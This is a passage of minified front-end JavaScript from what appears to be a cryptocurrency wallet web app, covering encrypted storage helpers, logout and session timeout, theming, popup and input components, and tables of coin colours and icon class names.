            const n = await a(decodeStorageByPassword(e, t));
            e && n && await a(ie.replaceStorage({
                password: e,
                data: n
            }));
            return n
        }
          , getSecureData = e => async (t, a) => {
            const n = a()
              , r = (0,
            oe.A0)(n);
            return null == r ? void 0 : r[e]
        }
          , setSecureData = (e, t) => async (a, n) => {
            const r = n()
              , l = (0,
            oe.A0)(r)
              , s = (0,
            oe.P2)(r);
            if (!l)
                return;
            l[e] = t;
            l["last-update-time"] = Date.now();
            const i = Q.AES.encrypt(JSON.stringify(l), s).toString();
            await a(ie.storageSaveAndTryFlush({
                data: i
            }))
        }
          , clearSecureStorage = () => async (e, t, a) => {
            let {persistor: n} = a;
            e(ct(!1));
            e(ne());
            await n.tryFlush()
        }
          , doLogout = function() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
            return async t => {
                e.reason && t(le({
                    reason: e.reason
                }));
                t(ie.setMasterPasswordCommit({
                    masterPassword: ""
                }));
                t(ae());
                setTimeout(( () => t(re())), 2e3);
                ft.emit("logout", {
                    dispatch: t
                })
            }
        }
          , withSecureStorageRestoreInProgress = e => async (t, a) => {
            const n = (0,
            oe.WT)(a());
            z()(!n, "No `withSecureStorageRestoreInProgress` inside `withSecureStorageRestoreInProgress`");
            t(se({
                isRestoreInProgress: !0
            }));
            try {
                return await e()
            } finally {
                t(se({
                    isRestoreInProgress: !1
                }))
            }
        }
        ;
        var _t = a(22222);
        const wt = "popups"
          , popupsStateSelector = e => e.popups
          , bt = (0,
        _t.P1)(popupsStateSelector, (e => {
            let {popupType: t} = e;
            return t || null
        }
        ))
          , kt = (0,
        _t.P1)(popupsStateSelector, (e => {
            let {popupParams: t} = e;
            return t || null
        }
        ));
        function throttle(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 250, a, n;
            return function() {
                for (var r = arguments.length, l = new Array(r), s = 0; s < r; s++)
                    l[s] = arguments[s];
                const i = +new Date;
                if (a && i < a + t) {
                    window.clearTimeout(n);
                    n = window.setTimeout(( () => {
                        a = i;
                        e(...l)
                    }
                    ), t)
                } else {
                    a = i;
                    e(...l)
                }
            }
        }
        let St;
        const session_timeout = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(oe.Oj)
              , a = (0,
            $.v9)(oe.gX)
              , n = (0,
            $.v9)(bt)
              , [r,l] = (0,
            O.useState)(NaN)
              , [s,i] = (0,
            O.useState)(404);
            (0,
            O.useEffect)(( () => {
                async function fetchTime() {
                    var t;
                    let a = null !== (t = await e(getSecureData(Ye))) && void 0 !== t ? t : 0;
                    6e3 != +a && (a = 15);
                    a = 60 * parseInt(String(a), 10) * 1e3;
                    l(a)
                }
                fetchTime()
            }
            ), [a, t]);
            (0,
            O.useEffect)(( () => {
                window.clearTimeout(St);
                r > 0 && (St = window.setTimeout(( () => {
                    "create-eos" !== n && t && e(doLogout({
                        reason: "session-timeout"
                    }))
                }
                ), r))
            }
            ), [s]);
            (0,
            O.useEffect)(( () => {
                const e = throttle(( () => i(Math.random())), 2e3);
                window.addEventListener("keyup", e);
                window.addEventListener("mousemove", e);
                window.addEventListener("focus", e);
                window.addEventListener("blur", e);
                return () => {
                    window.removeEventListener("keyup", e);
                    window.removeEventListener("mousemove", e);
                    window.removeEventListener("focus", e);
                    window.removeEventListener("blur", e)
                }
            }
            ), []);
            return null
        }
          , Ct = (0,
        te.createAction)("@theme/SET_THEME")();
        let Nt;
        !function(e) {
            e.dark = "dark";
            e.light = "light"
        }(Nt || (Nt = {}));
        const Tt = "theme"
          , At = ["theme"]
          , xt = {}
          , It = (0,
        te.createReducer)(xt).handleAction(Ct, ( (e, t) => {
            let {payload: {theme: a}} = t;
            return {
                ...e,
                theme: a
            }
        }
        ));
        let Pt, Lt = !1, Ft = !1;
        if (window && window.matchMedia && "function" == typeof window.matchMedia) {
            var Wt, Rt;
            Lt = !(null === (Wt = window.matchMedia("(prefers-color-scheme: dark)")) || void 0 === Wt || !Wt.matches);
            Ft = !(null === (Rt = window.matchMedia("(prefers-color-scheme: light)")) || void 0 === Rt || !Rt.matches)
        }
        const Bt = Lt || Ft;
        Bt && Lt ? Pt = Nt.dark : Ft && Bt && (Pt = Nt.light);
        (0,
        M.d)() && !Bt ? Pt = Nt.dark : Bt || (Pt = Nt.light);
        const themeSettingsStateSelector = e => e[Tt]
          , Ot = (0,
        _t.P1)(themeSettingsStateSelector, (e => {
            let {theme: t} = e;
            return t || Pt
        }
        ))
          , themeToClassName = e => `theme-${e}`
          , theme_effect = () => {
            const e = (0,
            $.v9)(Ot);
            (0,
            O.useEffect)(( () => {
                for (const e of Object.values(Nt)) {
                    const t = themeToClassName(e);
                    document.body.classList.remove(t)
                }
                const t = themeToClassName(e);
                document.body.classList.add(t)
            }
            ), [e]);
            return null
        }
          , Dt = ["/app/receive", "app/send", "app/history"];
        function ScrollToTop() {
            const e = (0,
            j.TH)();
            (0,
            O.useEffect)(( () => {
                Boolean(Dt.find((t => t === e.pathname))) || window.scrollTo(0, 0)
            }
            ), [e]);
            return null
        }
        const Mt = (0,
        te.createAction)("@popups/OPEN_POPUP")()
          , Ut = (0,
        te.createAction)("@popups/CLOSE_POPUP")()
          , Gt = undefined
          , Vt = O.createContext({
            popupType: null,
            popupParams: {},
            open: () => {}
            ,
            close: () => {}
        });
        var Kt = a(94184)
          , Ht = a.n(Kt);
        const zt = "popup_wrapperPopup_2Wj5z"
          , jt = "popup_isResponsive_alHlo"
          , $t = "popup_popup_3nldE"
          , Zt = "popup_overlay_1LedH"
          , Yt = "popup_closeIcon_3_1-D"
          , qt = "popup_isNewDesign_2UoCn"
          , Xt = a.p + "960726b53a426c08a36758fcd47e55af.svg"
          , Qt = a.p + "43f04ad7106dc439ab3161afc444d799.svg"
          , Jt = document.getElementById("popup")
          , ea = document.createElement("div");
        let ta = 0;
        ea.className = "popup-root";
        const PopupWrapper = e => {
            var t;
            const [a,n] = (0,
            O.useState)(!1)
              , r = (0,
            $.v9)(Ot)
              , handleResize = () => {
                const e = document.getElementById("root")
                  , t = document.body.offsetHeight;
                z()(e, "`#root` must be in the DOM");
                e.style.height = `${t}px`
            }
              , removePopup = () => {
                n(!1);
                try {
                    if (Jt) {
                        const e = document.getElementById("root");
                        z()(e, "`#root` must be in the DOM");
                        e.className = "";
                        e.style.height = "100%";
                        window.scrollTo(0, ta);
                        Jt.removeChild(ea)
                    }
                } catch (e) {}
            }
              , l = (0,
            O.useCallback)(( () => {
                if (!a) {
                    n(!0);
                    try {
                        if (Jt) {
                            ta = window.scrollY;
                            const e = document.body.offsetHeight
                              , t = document.getElementById("root");
                            z()(t, "`#root` must be in the DOM");
                            t.className = "popup-open";
                            t.scrollTop = ta;
                            t.style.height = `${e}px`;
                            Jt.appendChild(ea)
                        }
                    } catch (e) {}
                    e.onOpen && e.onOpen()
                }
            }
            ), [a, e])
              , s = (0,
            O.useCallback)(( () => {
                removePopup();
                e.onClose && e.onClose()
            }
            ), [e])
              , i = (0,
            O.useCallback)((t => {
                27 !== t.keyCode || e.unclosable || s()
            }
            ), [s, e.unclosable]);
            (0,
            O.useEffect)(( () => {
                if (a) {
                    window.addEventListener("keydown", i, !1);
                    window.addEventListener("resize", handleResize, !1);
                    return () => {
                        window.removeEventListener("keydown", i, !1);
                        window.removeEventListener("resize", handleResize, !1)
                    }
                }
            }
            ), [i, a, e.unclosable]);
            (0,
            O.useEffect)(( () => () => {
                removePopup()
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                e.visible && l();
                !e.visible && a && removePopup()
            }
            ), [l, a, e.visible]);
            if (!e.visible || !a)
                return null;
            const o = (0,
            M.p1)() || (0,
            M.tq)()
              , c = o && "dark" !== r ? Xt : Qt
              , u = O.createElement("div", {
                className: Ht()(zt, {
                    [jt]: o
                })
            }, O.createElement("div", {
                className: Zt,
                onClick: e.unclosable ? void 0 : s
            }, e.unclosable || e.withoutCloseIcon ? null : O.createElement("img", {
                src: c,
                alt: "",
                className: Yt,
                onClick: s
            })), O.createElement("div", {
                className: Ht()($t, e.className),
                style: {
                    width: e.width,
                    marginLeft: -(null !== (t = e.width) && void 0 !== t ? t : NaN) / 2 || "0"
                },
                id: "parent-popup"
            }, e.children));
            return (0,
            D.createPortal)(u, ea)
        }
          , aa = PopupWrapper
          , na = "input_input_25CrX"
          , ra = "input_isInvalid_1GrNS"
          , la = "input_isSelect_34mZ3"
          , sa = "input_wrapper_1oeau"
          , ia = "input_isNewDesign_1uCtz"
          , oa = "input_withOverflow_2-3RM"
          , ca = "input_errorMessage_23H_H"
          , ua = "input_newErrorMessage_3ZhW0"
          , da = "input_button_1u_io"
          , ma = "input_buttonColorRed_it5QN";
        function InputError(e) {
            const {isNewDesign: t, className: a, customInputStyle: n, withOverflow: r, isSelect: l, isInvalid: s, top: i, right: o, left: c, children: u} = e
              , d = e.message ? e.message.toString() : ""
              , m = {
                marginTop: i || (l ? -2 : -27),
                paddingLeft: c || -20,
                paddingRight: o || 10
            }
              , p = Boolean(null == d ? void 0 : d.includes("Must be greater than"))
              , f = Boolean(null == d ? void 0 : d.includes("Must be less than"))
              , E = (p || f) && !(null != d && d.includes("ADA")) && !(null != d && d.includes("DOT"));
            return t ? O.createElement("div", {
                className: Ht()(sa, {
                    [ra]: s,
                    [la]: l
                })
            }, O.createElement("div", {
                className: Ht()(ia, n, {
                    [oa]: r
                })
            }, u), !!d && s && O.createElement("div", {
                className: Ht()(ua, a),
                style: m
            }, E ? O.createElement("span", null, d) : d)) : O.createElement("div", {
                className: Ht()(sa, {
                    [ra]: s,
                    [la]: l
                })
            }, u, !!d && s && O.createElement("div", {
                className: Ht()(ca, a),
                style: m
            }, E ? O.createElement("span", null, d) : d))
        }
        InputError.defaultProps = {
            message: ""
        };
        const pa = InputError;
        function _extends() {
            _extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return _extends.apply(this, arguments)
        }
        const fa = O.forwardRef(( (e, t) => {
            const {onEnter: a, className: n, ...r} = e
              , handleOnKeyDown = t => {
                13 === t.keyCode && a && a(t);
                e.onKeyDown && e.onKeyDown(t)
            }
            ;
            return O.createElement("input", _extends({}, r, {
                ref: t,
                className: Ht()(n, na),
                spellCheck: "false",
                autoCorrect: "off",
                autoComplete: "new-password",
                onKeyDown: handleOnKeyDown
            }))
        }
        ));
        fa.displayName = "Input";
        const Ea = fa;
        var ha = a(67144);
        const ga = JSON.parse('{"aya":"#FBBB10","bch":"#ee8c28","bsv":"#E8B321","btg":"#00206B","rvn":"#F15B22","crm":"#CB2027","dash":"#008DE4","btc":"#F2A900","bsc":"#4f4d48","btcv":"#FFD663","bth":"#F6CA69","dcr":"#2ED6A1","dgb":"#006AD2","doge":"#C3A634","grs":"#377E96","kmd":"#326464","vtc":"#048657","ltc":"#d3d3d3","nlg":"#2AB0FD","qtum":"#2E9AD0","rdd":"#E30613","zec":"#ECB244","yec":"#3A3A3A","firo":"#23B852","clo":"#34C88A","etc":"#328332","eth":"#151C2F","ethop":"#151C2F","etharb":"#151C2F","ropsten":"#627EEA","joys":"#2A50A2","exp":"#FFAA5C","ubq":"#00EA90","ada":"#333333","atom":"#0A2E62","eos":"#000000","lsk":"#0D4EA0","neo":"#58BF00","waves":"#0155FF","xlm":"#14B6E7","kin":"#005FFF","xmr":"#FF6600","xtz":"#A6E000","xrp":"#006097","xvg":"#00CBFF","xem":"#67B2E8","zen":"#234871","trx":"#000000","bnb":"#F3BA2F","vet":"#15BDFF","ont":"#48A3FF","ong":"#48A3FF","fio":"#1C164E","usdt":"#26a17b","now":"#2b2535","arn":"#3e92be","mkr":"#52a99c","bat":"#ff5103","wax":"#ffca26","gas":"#18a972","vtho":"#4b719f","anc":"#7b7b7b","ethplo":"#1b96e0","usdc":"#2775ca","tusd":"#2b2f7e","xaut":"#e7cca1","enj":"#9368fe","zil":"#4bc0bf","link":"#335dd2","zrx":"#1d2327","npxs":"#202020","gusd":"#26def8","ae":"#d04070","dai":"#b58805","iost":"#1d1d1d","snt":"#5c6cee","eurs":"#16bbff","ely":"#23377f","lst":"#12275e","lrc":"#1d61ff","bec":"#fccb48","cor":"#2657aa","hot":"#134145","omg":"#1b1b1b","rep":"#4b2240","saturn":"#000000","corp":"#ff7130","bct":"#9ac52d","btt":"#000000","tone":"#67b17d","btm":"#f79535","builder":"#959403","ehr":"#37b7a1","seed":"#fdd632","scc":"#ffe95f","truc":"#ea2226","poppy":"#ea8b80","terc":"#000000","btzc":"#7d029d","win":"#111d3c","tronish":"#bd2f20","twx":"#c048b0","igg":"#1b3860","busd":"#f1b909","erd":"#000000","spnd":"#277de6","awc":"#67a0f4","fund":"#3183cb","ankr":"#5899ed","lto":"#a883f9","raven":"#364858","chz":"#b12728","cos":"#279df9","bolt":"#2c9bcc","vrab":"#d70e43","lba":"#2556d4","ftm":"#29b6ea","west":"#06a87a","liquid":"#d5b4d6","tn":"#208f50","kln":"#ff9400","tdx":"#4d414b","tryx":"#d33437","cof":"#faf275","wct":"#42bad1","zrc":"#448950","smq":"#3425a4","incnt":"#0061fe","tks":"#21d6c3","ww":"#361ee7","wgo":"#278fd8","wbet":"#034cdc","mtnt":"#0281ff","iqcash":"#8c3064","sign":"#fb15a6","ndx":"#0368ff","pti":"#ff2403","nut":"#1b4168","eosdt":"#1392ff","iq":"#094c89","meetone":"#000000","cro":"#21376c","ht":"#2a3168","knc":"#30cb9e","leo":"#171d20","okb":"#4692fb","rune":"#20eebc","kava":"#ff564f","wrx":"#2f68f0","ava":"#2d2d4f","nano":"#209ce9","algo":"#000000","near":"#000000","ada-shelley":"#0033ad","xdc":"#244b81","dot":"#E6007A","hbar":"#000000","gala":"#000000","klv":"#b941f4","amp":"#d9327c","ftt":"#151c2f","inj":"#171822 ","sanshu":"#ff7dab","hoge":"#1d1d1b","awg":"#fdd835","aws":"#d4d9e6","shib":"#c00400","axs":"#0089db","safemoon":"#25223d","2lc":"#ec681c","pre":"#2d8eff","arnx":"#2c85bd","stxem":"#00aeef","one":"#00aee9","srx":"#fff","sol":"#000","wam":"transparent","hmstr":"#fff","luna":"#010101","egld":"#000","apt":"#fff","xec":"transparent"}')
          , ya = {
            "icon-byts": "icon-currency_icon-byts_LA3y3",
            "icon-stash": "icon-currency_icon-stash_2gnci",
            "icon-hex": "icon-currency_icon-hex_1XhZO",
            "icon-crm": "icon-currency_icon-crm_1V7cO",
            "icon-fio": "icon-currency_icon-fio_3CBSc",
            "icon-nut": "icon-currency_icon-nut_YvJ0s",
            "icon-eosdt": "icon-currency_icon-eosdt_eV8zg",
            "icon-ong": "icon-currency_icon-ong_1-G9m",
            "icon-busd": "icon-currency_icon-busd_BCMhh",
            "icon-iq": "icon-currency_icon-iq_37BcP",
            "icon-lst": "icon-currency_icon-lst_1eMWJ",
            "icon-gas": "icon-currency_icon-gas_3fMx5",
            "icon-xns": "icon-currency_icon-xns_26NWV",
            "icon-pyn": "icon-currency_icon-pyn_1oMCI",
            "icon-ncash": "icon-currency_icon-ncash_2Q-IG",
            "icon-loki": "icon-currency_icon-loki_2H4bS",
            "icon-knc": "icon-currency_icon-knc_1kFZ-",
            "icon-job": "icon-currency_icon-job_31n50",
            "icon-chz": "icon-currency_icon-chz_wAEvz",
            "icon-btu": "icon-currency_icon-btu_1rO4O",
            "icon-apis": "icon-currency_icon-apis_RRQly",
            "icon-rvn": "icon-currency_icon-rvn_3FDqA",
            "icon-enj": "icon-currency_icon-enj_9riat",
            "icon-iotx": "icon-currency_icon-iotx_3ObK5",
            "icon-ethplo": "icon-currency_icon-ethplo_foqn9",
            "icon-aya": "icon-currency_icon-aya_1f2OZ",
            "icon-yec": "icon-currency_icon-yec_ECRRC",
            "icon-ankr": "icon-currency_icon-ankr_2IEoZ",
            "icon-erd": "icon-currency_icon-erd_2c5e9",
            "icon-ftm": "icon-currency_icon-ftm_2R-N5",
            "icon-lto": "icon-currency_icon-lto_5GF7M",
            "icon-und": "icon-currency_icon-und_2U7qu",
            "icon-vrab": "icon-currency_icon-vrab_ZoiEV",
            "icon-atom": "icon-currency_icon-atom_1lnQI",
            "icon-bnbmainnet": "icon-currency_icon-bnbmainnet_1DClG",
            "icon-eth-ropsten": "icon-currency_icon-eth-ropsten_mUOdC",
            "icon-ropsten": "icon-currency_icon-ropsten_3XGxu",
            "icon-btc-testnet": "icon-currency_icon-btc-testnet_3h5UY",
            "icon-now-e68": "icon-currency_icon-now-e68_bDlbA",
            "icon-awc-986": "icon-currency_icon-awc-986_1hTBJ",
            "icon-awc": "icon-currency_icon-awc_2M4G5",
            "icon-ont": "icon-currency_icon-ont_2If9l",
            "icon-kin": "icon-currency_icon-kin_Rt-O_",
            "icon-vtho": "icon-currency_icon-vtho_c0WC4",
            "icon-vet": "icon-currency_icon-vet_1dPtJ",
            "icon-npxs": "icon-currency_icon-npxs_1Fpbt",
            "icon-r": "icon-currency_icon-r_1Ry23",
            "icon-link": "icon-currency_icon-link_1lN9e",
            "icon-hot": "icon-currency_icon-hot_2eu_y",
            "icon-gusd": "icon-currency_icon-gusd_2BNUg",
            "icon-eurs": "icon-currency_icon-eurs_3ojEN",
            "icon-trezor": "icon-currency_icon-trezor_2fdJf",
            "icon-ledger": "icon-currency_icon-ledger_2GfPZ",
            "icon-bth": "icon-currency_icon-bth_1VpKJ",
            "icon-bsv": "icon-currency_icon-bsv_1PWvz",
            "icon-bchsv": "icon-currency_icon-bchsv_3iEUZ",
            "icon-joys": "icon-currency_icon-joys_3rHo7",
            "icon-tusd": "icon-currency_icon-tusd_zim2N",
            "icon-usdc": "icon-currency_icon-usdc_1cLFM",
            "icon-dai": "icon-currency_icon-dai_bH115",
            "icon-pax": "icon-currency_icon-pax_3Zz7O",
            "icon-aion": "icon-currency_icon-aion_2MU5B",
            "icon-ela": "icon-currency_icon-ela_1g-HW",
            "icon-smart": "icon-currency_icon-smart_2Te2m",
            "icon-ely": "icon-currency_icon-ely_3q72r",
            "icon-btcp": "icon-currency_icon-btcp_1Oe9b",
            "icon-ebst": "icon-currency_icon-ebst_UIFfb",
            "icon-elf": "icon-currency_icon-elf_1K57x",
            "icon-hsr": "icon-currency_icon-hsr_16QGN",
            "icon-iost": "icon-currency_icon-iost_2QlWu",
            "icon-loom": "icon-currency_icon-loom_1dvPp",
            "icon-mkr": "icon-currency_icon-mkr_2cimJ",
            "icon-nas": "icon-currency_icon-nas_xDB6G",
            "icon-now": "icon-currency_icon-now_2nkvd",
            "icon-snm": "icon-currency_icon-snm_2UEQT",
            "icon-synx": "icon-currency_icon-synx_xYJ_9",
            "icon-wan": "icon-currency_icon-wan_15j-9",
            "icon-brd": "icon-currency_icon-brd_3QWKQ",
            "icon-mana": "icon-currency_icon-mana_12N5c",
            "icon-mer": "icon-currency_icon-mer_2pSHp",
            "icon-tix": "icon-currency_icon-tix_1JyYq",
            "icon-xel": "icon-currency_icon-xel_38LKV",
            "icon-zen": "icon-currency_icon-zen_31X5J",
            "icon-dkk": "icon-currency_icon-dkk_iGao1",
            "icon-gbp": "icon-currency_icon-gbp_2phPD",
            "icon-eur": "icon-currency_icon-eur_1a80e",
            "icon-usd": "icon-currency_icon-usd_2kQzw",
            "icon-ukg": "icon-currency_icon-ukg_1vJib",
            "icon-lrc": "icon-currency_icon-lrc_26SZy",
            "icon-powr": "icon-currency_icon-powr_1TJpp",
            "icon-eng": "icon-currency_icon-eng_dI2Js",
            "icon-ngc": "icon-currency_icon-ngc_3DIKu",
            "icon-srn": "icon-currency_icon-srn_EfzxN",
            "icon-wax": "icon-currency_icon-wax_2tnqK",
            "icon-dcn": "icon-currency_icon-dcn_fB8qc",
            "icon-gbyte": "icon-currency_icon-gbyte_2mhfa",
            "icon-cnd": "icon-currency_icon-cnd_2tnsa",
            "icon-miota": "icon-currency_icon-miota_1It6q",
            "icon-adt": "icon-currency_icon-adt_3b-E6",
            "icon-via": "icon-currency_icon-via_bSyRC",
            "icon-myst": "icon-currency_icon-myst_ybud2",
            "icon-cfi": "icon-currency_icon-cfi_2ejeV",
            "icon-dsh": "icon-currency_icon-dsh_2TMQN",
            "icon-xlm": "icon-currency_icon-xlm_3GUOZ",
            "icon-fsbt": "icon-currency_icon-fsbt_3Ir8R",
            "icon-atl": "icon-currency_icon-atl_2Jfu4",
            "icon-ath": "icon-currency_icon-ath_NPbQA",
            "icon-arn": "icon-currency_icon-arn_3fGfl",
            "icon-arc": "icon-currency_icon-arc_BF0po",
            "icon-apt": "icon-currency_icon-apt_2OyTx",
            "icon-aidoc": "icon-currency_icon-aidoc_2GWLY",
            "icon-amis": "icon-currency_icon-amis_D8DcK",
            "icon-adst": "icon-currency_icon-adst_3slaC",
            "icon-300": "icon-currency_icon-300_6lw8p",
            "icon-crpt": "icon-currency_icon-crpt_1xOsq",
            "icon-tip": "icon-currency_icon-tip_1ULG6",
            "icon-zil": "icon-currency_icon-zil_3TywA",
            "icon-xnn": "icon-currency_icon-xnn_1OLl_",
            "icon-viu": "icon-currency_icon-viu_D1uEs",
            "icon-veri": "icon-currency_icon-veri_3U6SP",
            "icon-sc": "icon-currency_icon-sc_184ZR",
            "icon-rhoc": "icon-currency_icon-rhoc_33FJ4",
            "icon-kcs": "icon-currency_icon-kcs_TahVd",
            "icon-icx": "icon-currency_icon-icx_lWnON",
            "icon-ark": "icon-currency_icon-ark_tuCRB",
            "icon-ae": "icon-currency_icon-ae_3BDe_",
            "icon-nmr": "icon-currency_icon-nmr_2QFga",
            "icon-vib": "icon-currency_icon-vib_1c326",
            "icon-stx": "icon-currency_icon-stx_1K9mL",
            "icon-sbtc": "icon-currency_icon-sbtc_1yMnP",
            "icon-rcn": "icon-currency_icon-rcn_-n7oj",
            "icon-1st": "icon-currency_icon-1st_3oYOg",
            "icon-ada": "icon-currency_icon-ada_Peuxd",
            "icon-adc": "icon-currency_icon-adc_2_CU0",
            "icon-adx": "icon-currency_icon-adx_2gyna",
            "icon-aeon": "icon-currency_icon-aeon_1q9LJ",
            "icon-amp": "icon-currency_icon-amp_3uzbX",
            "icon-anc": "icon-currency_icon-anc_35uwP",
            "icon-ant": "icon-currency_icon-ant_3tI-J",
            "icon-arch": "icon-currency_icon-arch_1g0RL",
            "icon-ardr": "icon-currency_icon-ardr_M0kxO",
            "icon-aur": "icon-currency_icon-aur_2R0as",
            "icon-banx": "icon-currency_icon-banx_2Dh50",
            "icon-bat": "icon-currency_icon-bat_rNBaW",
            "icon-bay": "icon-currency_icon-bay_18a9V",
            "icon-bc": "icon-currency_icon-bc_3sKve",
            "icon-bch": "icon-currency_icon-bch_2ivFL",
            "icon-bcn": "icon-currency_icon-bcn_2IiFo",
            "icon-bft": "icon-currency_icon-bft_xIWug",
            "icon-bnb": "icon-currency_icon-bnb_3caqM",
            "icon-bnt": "icon-currency_icon-bnt_SAiCq",
            "icon-brk": "icon-currency_icon-brk_1fciq",
            "icon-brx": "icon-currency_icon-brx_30DLd",
            "icon-bsd": "icon-currency_icon-bsd_3zwad",
            "icon-bta": "icon-currency_icon-bta_2tp7D",
            "icon-btc": "icon-currency_icon-btc_2var7",
            "icon-btcd": "icon-currency_icon-btcd_14AZ4",
            "icon-btg": "icon-currency_icon-btg_2VmtF",
            "icon-btm": "icon-currency_icon-btm_2Pnnv",
            "icon-bts": "icon-currency_icon-bts_dlzxp",
            "icon-clam": "icon-currency_icon-clam_3iB9s",
            "icon-clo": "icon-currency_icon-clo_1v3JY",
            "icon-cloak": "icon-currency_icon-cloak_1UaCk",
            "icon-cvc": "icon-currency_icon-cvc_3XJG-",
            "icon-dao": "icon-currency_icon-dao_3Crex",
            "icon-dash": "icon-currency_icon-dash_1Kvhc",
            "icon-dcr": "icon-currency_icon-dcr_pfu7a",
            "icon-dct": "icon-currency_icon-dct_2iwA3",
            "icon-dent": "icon-currency_icon-dent_Kejef",
            "icon-dgb": "icon-currency_icon-dgb_1TuNr",
            "icon-dgd": "icon-currency_icon-dgd_-KFb-",
            "icon-dgx": "icon-currency_icon-dgx_1JMbO",
            "icon-dmd": "icon-currency_icon-dmd_2KqrN",
            "icon-dnt": "icon-currency_icon-dnt_2zK4R",
            "icon-doge": "icon-currency_icon-doge_jFXBg",
            "icon-edg": "icon-currency_icon-edg_Vdbr-",
            "icon-emc": "icon-currency_icon-emc_7sln9",
            "icon-eos": "icon-currency_icon-eos_2UYml",
            "icon-erc": "icon-currency_icon-erc_1r30X",
            "icon-etc": "icon-currency_icon-etc_15Oyc",
            "icon-eth": "icon-currency_icon-eth_2UCm7",
            "icon-exp": "icon-currency_icon-exp_2OG7g",
            "icon-fc2": "icon-currency_icon-fc2_1zuC-",
            "icon-fcn": "icon-currency_icon-fcn_28bpx",
            "icon-fct": "icon-currency_icon-fct_1eLu_",
            "icon-flo": "icon-currency_icon-flo_37w2Q",
            "icon-frk": "icon-currency_icon-frk_2KwCi",
            "icon-ftc": "icon-currency_icon-ftc_23k1X",
            "icon-fun": "icon-currency_icon-fun_1h9rb",
            "icon-game": "icon-currency_icon-game_1m39e",
            "icon-gbg": "icon-currency_icon-gbg_1ftA4",
            "icon-gdc": "icon-currency_icon-gdc_vYA-W",
            "icon-gemz": "icon-currency_icon-gemz_1k8Tj",
            "icon-gld": "icon-currency_icon-gld_hvFOr",
            "icon-gno": "icon-currency_icon-gno_1lblx",
            "icon-gnt": "icon-currency_icon-gnt_8FQLr",
            "icon-golos": "icon-currency_icon-golos_bT4hT",
            "icon-grc": "icon-currency_icon-grc_1ZYSt",
            "icon-grs": "icon-currency_icon-grs_1Ndas",
            "icon-gup": "icon-currency_icon-gup_3iwZO",
            "icon-heat": "icon-currency_icon-heat_3l2pi",
            "icon-hmq": "icon-currency_icon-hmq_2Z9vs",
            "icon-icn": "icon-currency_icon-icn_39y9h",
            "icon-ifc": "icon-currency_icon-ifc_1p4Cx",
            "icon-incnt": "icon-currency_icon-incnt_1f9pC",
            "icon-ioc": "icon-currency_icon-ioc_H62lz",
            "icon-ixt": "icon-currency_icon-ixt_20J4i",
            "icon-jbs": "icon-currency_icon-jbs_2OLBP",
            "icon-kmd": "icon-currency_icon-kmd_3yzZ5",
            "icon-kore": "icon-currency_icon-kore_32B_9",
            "icon-lbc": "icon-currency_icon-lbc_2VwnM",
            "icon-ldoge": "icon-currency_icon-ldoge_3_KPK",
            "icon-lsk": "icon-currency_icon-lsk_3sbqh",
            "icon-ltc": "icon-currency_icon-ltc_4f4qy",
            "icon-lun": "icon-currency_icon-lun_1mqlb",
            "icon-maid": "icon-currency_icon-maid_3Rkuo",
            "icon-mco": "icon-currency_icon-mco_1CrU7",
            "icon-mint": "icon-currency_icon-mint_2hMME",
            "icon-mln": "icon-currency_icon-mln_1dh72",
            "icon-mona": "icon-currency_icon-mona_UfohZ",
            "icon-mrc": "icon-currency_icon-mrc_2_HbV",
            "icon-msc": "icon-currency_icon-msc_VF1EA",
            "icon-msp": "icon-currency_icon-msp_3KHr7",
            "icon-mtl": "icon-currency_icon-mtl_ngyY1",
            "icon-mtr": "icon-currency_icon-mtr_2B-mv",
            "icon-mue": "icon-currency_icon-mue_1ZwqR",
            "icon-nano": "icon-currency_icon-nano_39lPB",
            "icon-nav": "icon-currency_icon-nav_qkO_K",
            "icon-nbt": "icon-currency_icon-nbt_3NEep",
            "icon-neo": "icon-currency_icon-neo_3z-aW",
            "icon-neos": "icon-currency_icon-neos_UUSMa",
            "icon-neu": "icon-currency_icon-neu_2Ia6u",
            "icon-nlg": "icon-currency_icon-nlg_2fKz6",
            "icon-nmc": "icon-currency_icon-nmc_ovt74",
            "icon-note": "icon-currency_icon-note_3m_bj",
            "icon-nvc": "icon-currency_icon-nvc_3Es4E",
            "icon-nxt": "icon-currency_icon-nxt_1TBcY",
            "icon-oax": "icon-currency_icon-oax_1dFjf",
            "icon-ok": "icon-currency_icon-ok_1Dmmo",
            "icon-omg": "icon-currency_icon-omg_2zJJn",
            "icon-omni": "icon-currency_icon-omni_2qjaH",
            "icon-opal": "icon-currency_icon-opal_3hGqN",
            "icon-part": "icon-currency_icon-part_K_d-c",
            "icon-pay": "icon-currency_icon-pay_1yMVu",
            "icon-piggy": "icon-currency_icon-piggy_3qd6H",
            "icon-pink": "icon-currency_icon-pink_B8sVu",
            "icon-pivx": "icon-currency_icon-pivx_himng",
            "icon-plbt": "icon-currency_icon-plbt_131W6",
            "icon-plr": "icon-currency_icon-plr_1-P_9",
            "icon-plu": "icon-currency_icon-plu_1Z6Nv",
            "icon-pot": "icon-currency_icon-pot_sNtbO",
            "icon-ppc": "icon-currency_icon-ppc_3D66v",
            "icon-ptoy": "icon-currency_icon-ptoy_35ezU",
            "icon-qcn": "icon-currency_icon-qcn_2AroW",
            "icon-qrk": "icon-currency_icon-qrk_3QWdQ",
            "icon-qtum": "icon-currency_icon-qtum__zbBk",
            "icon-rads": "icon-currency_icon-rads_20c55",
            "icon-rbies": "icon-currency_icon-rbies_2XeR7",
            "icon-rbt": "icon-currency_icon-rbt_2w_8K",
            "icon-rby": "icon-currency_icon-rby_18EY8",
            "icon-rdd": "icon-currency_icon-rdd_9zGQn",
            "icon-rep": "icon-currency_icon-rep_2hYwb",
            "icon-rise": "icon-currency_icon-rise_27g0q",
            "icon-rlc": "icon-currency_icon-rlc_v9Eds",
            "icon-salt": "icon-currency_icon-salt_312T3",
            "icon-sar": "icon-currency_icon-sar_Ttksl",
            "icon-scot": "icon-currency_icon-scot_3igZ3",
            "icon-sdc": "icon-currency_icon-sdc_-fbJU",
            "icon-sia": "icon-currency_icon-sia_1np3g",
            "icon-sjcx": "icon-currency_icon-sjcx_32prt",
            "icon-slg": "icon-currency_icon-slg_2iUFG",
